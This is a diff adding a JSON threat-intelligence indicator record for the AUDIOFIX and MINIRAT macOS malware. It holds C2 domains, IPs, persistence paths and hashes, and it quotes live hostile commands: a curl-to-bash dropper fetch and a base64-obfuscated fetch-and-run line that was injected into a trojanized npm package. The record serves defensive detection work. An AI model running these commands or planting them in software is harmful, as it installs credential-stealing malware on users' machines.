@@ -1,0 +1,325 @@
+{
+  "malware_family": "AUDIOFIX",
+  "threat_actor": "JINX-0164",
+  "platforms": [
+    "macos"
+  ],
+  "summary": "JINX-0164 is a financially motivated threat actor targeting the cryptocurrency industry since at least mid-2025. The group uses social engineering to deploy custom macOS malware, AUDIOFIX and MINIRAT, for credential theft and lateral movement. They have also conducted supply chain attacks against developers via trojanized NPM packages.",
+  "mitre_techniques": [],
+  "host_artifacts": [
+    {
+      "kind": "pdb_path",
+      "value": "alibaba.xyz/minirat",
+      "context": "Go module path for MINIRAT malware, giving it its name.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "v59l2uwlow9s1ebuscgfg9k9r4voxkbs",
+      "context": "Hardcoded AES key used by both AUDIOFIX and MINIRAT samples.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents/com.microsoft.teams.coreaudiod.plist",
+      "context": "AUDIOFIX persistence plist file masquerading as Microsoft Teams.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/Library/LaunchAgents/com.apple.Terminal.profiler.plist",
+      "context": "MINIRAT persistence plist file.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "~/.zsh_cache",
+      "context": "File where stolen macOS password is written after XOR encoding.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_path",
+      "value": "/clip",
+      "context": "Log file for captured clipboard content.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "ChromeUpdater",
+      "context": "Filename the AUDIOFIX payload was saved as.",
+      "specificity": "medium",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "com.microsoft.teams.coreaudiod",
+      "context": "AUDIOFIX LaunchAgent label for persistence.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "com.apple.Terminal.profiler",
+      "context": "MINIRAT LaunchAgent label for persistence.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "service_name",
+      "value": "chrome.job",
+      "context": "Label for the launchctl job created by the dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "launchctl submit -l chrome.job -- \"$DRIVER_PATH\" --update",
+      "context": "Dropper script command to execute and persist the malware.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "/bin/bash -c \"$(curl -fsSL https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh)\"",
+      "context": "Command executed by victim from a fake troubleshooting page.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "command_line",
+      "value": "echo 'bm9odXAgYmFzaCAtYyAiJChjdXJsIC1mc1NMIGh0dHA6Ly84OS4zNi4yMjQuNS90cm91Ymxlc2hvb3QvbWFjL2luc3RhbGwuc2gpIiA+IC9kZXYvbnVsbCAyPiYx' | (base64 --decode 2> /dev/null || base64 -D) | bash",
+      "context": "Malicious command appended to @velora-dex/sdk package's index.js.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "Network latency detected",
+      "context": "Fake prompt text used in TCC clickjacking attack.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "other",
+      "value": "@velora-dex/sdk",
+      "context": "NPM package trojanized in a supply chain attack.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": "",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "unique_string",
+      "value": "nord-stream",
+      "context": "Default committer name used by the exfiltration tool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "nord-stream",
+      "hash_algo": "",
+      "hash_value": ""
+    },
+    {
+      "kind": "file_name",
+      "value": "init_ZkITM.yaml",
+      "context": "Default workflow filename used by the nord-stream tool.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": "nord-stream",
+      "hash_algo": "",
+      "hash_value": ""
+    }
+  ],
+  "network_artifacts": [
+    {
+      "kind": "domain",
+      "value": "datahub.ink",
+      "context": "Primary C2 domain hardcoded in AUDIOFIX and MINIRAT.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "cloud-sync.online",
+      "context": "Fallback C2 domain hardcoded in malware.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "byte-io.us",
+      "context": "Fallback C2 domain hardcoded in malware.",
+      "specificity": "high",
+      "evidence": "explicit_literal",
+      "origin_tool": ""
+    },
+    {
+      "kind": "uri_path",
+      "value": "/file/upload",
+      "context": "C2 path used by AUDIOFIX to upload collected data.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://apple.driver-store.com/mac/arm/driver/coreaudiod",
+      "context": "Payload download URL from dropper script.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "url",
+      "value": "https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh",
+      "context": "Dropper script URL from a fake troubleshooting page.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "bitget-meeting.com",
+      "context": "Domain spoofing a cryptocurrency trading platform for meetings.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "teamicrosoft.com",
+      "context": "Domain spoofing Microsoft Teams.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "my-home-company-group.us03-slack.online",
+      "context": "Domain spoofing Slack.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "domain",
+      "value": "windows.driver-store.com",
+      "context": "Payload delivery domain suggesting potential Windows targeting.",
+      "specificity": "high",
+      "evidence": "prose",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "89.36.224.5",
+      "context": "IP address hosting dropper script for supply chain attack.",
+      "specificity": "high",
+      "evidence": "figure_or_disassembly",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "208.115.220.17",
+      "context": "Resolved IP for C2 domain datahub.ink.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    },
+    {
+      "kind": "ip",
+      "value": "185.175.59.85",
+      "context": "Resolved IP for C2 domain datahub.ink.",
+      "specificity": "high",
+      "evidence": "ioc_list",
+      "origin_tool": ""
+    }
+  ],
+  "samples": [
+    {
+      "sha256": "0a8ab3d16b12d3a453ee5a3208fe04744ad54514ef8ea27bb8fe32679efad270",
+      "description": "MINIRAT ARM64 payload."
+    },
+    {
+      "sha256": "0b028b781950641818800fee2b4bf68e4ef2bcee53fe71a21755275ba108783d",
+      "description": "MINIRAT x86_64 payload."
+    },
+    {
+      "sha256": "65cba741fe30fa4799fb9002ea8de6d96042a59159dd7c3419c766af24c835e6",
+      "description": "AUDIOFIX HTTPS C2 variant, ARM64."
+    },
+    {
+      "sha256": "0b1a36a31b952341a534fe24890f1ed2921ee259773cff46e4f6273b8c4d5d21",
+      "description": "AUDIOFIX HTTPS C2 variant, x86_64."
+    },
+    {
+      "sha256": "e8ee6f5145c9d503c5130bfc6585567f6e19d409158c3c0ca0b259f1875b15f4",
+      "description": "AUDIOFIX Dropbox C2 variant, ARM64."
+    },
+    {
+      "sha256": "3e3901519c2305fbe9d5483b7234c25c6d2b562512916481d96f26b849c39fdb",
+      "description": "AUDIOFIX Dropbox C2 variant, x86_64."
+    },
+    {
+      "sha256": "9c2ce925133a3bf5a924063bbef8df49918d5b7258695c1894cd18c75970157a",
+      "description": "Dropper script for fake audio fix from apple.driver-store.com."
+    },
+    {
+      "sha256": "c6ef82d2864dfd26f117a1ef5602679153423f2742970a7949cec72722f0a01e",
+      "description": "Dropper script delivered via supply chain attack (89.36.224.5)."
+    }
+  ],
+  "file_types": [
+    "macho",
+    "script"
+  ]
+}
